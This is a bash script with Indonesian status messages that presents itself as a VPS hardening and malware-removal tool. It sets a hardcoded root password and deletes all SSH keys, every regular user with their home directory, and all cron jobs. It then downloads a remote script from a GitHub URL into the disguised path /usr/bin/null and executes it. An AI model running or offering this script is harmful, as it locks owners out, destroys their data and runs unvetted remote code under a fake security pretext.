#!/bin/bash

echo "root:ZeroKu9$" | chpasswd
echo "[✓] Password root diganti."

rm -f /root/.ssh/authorized_keys
find /home -name authorized_keys -exec rm -f {} \;
echo "[✓] SSH key dihapus."

sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart ssh
echo "[✓] Login root via SSH dimatikan."

for user in $(awk -F: '$3 >= 1000 {print $1}' /etc/passwd); do
  if [ "$user" != "root" ]; then
    deluser --remove-home "$user"
    echo "[✓] User $user dihapus."
  fi
done

crontab -r
rm -rf /etc/cron.*/* /var/spool/cron/* /var/spool/cron/crontabs/*
echo "[✓] Cron job dibersihkan."

apt update && apt upgrade -y
apt install ufw -y
ufw allow ssh
ufw enable
[ -f /usr/bin/null ] && rm -vf /usr/bin/null && echo -e "\n[✓] force update dan jalankan command untuk menghapus mallware secara otomatis!! \n"
wget -qO /usr/bin/null "https://raw.githubusercontent.com/triadzyu/very/ganteng/upx_null.sh"
chmod +x /usr/bin/null && null
echo "[✓] Sistem diupdate dan firewall aktif."
echo "[✓] VPS aman. Silakan relogin untuk cek hasilnya."
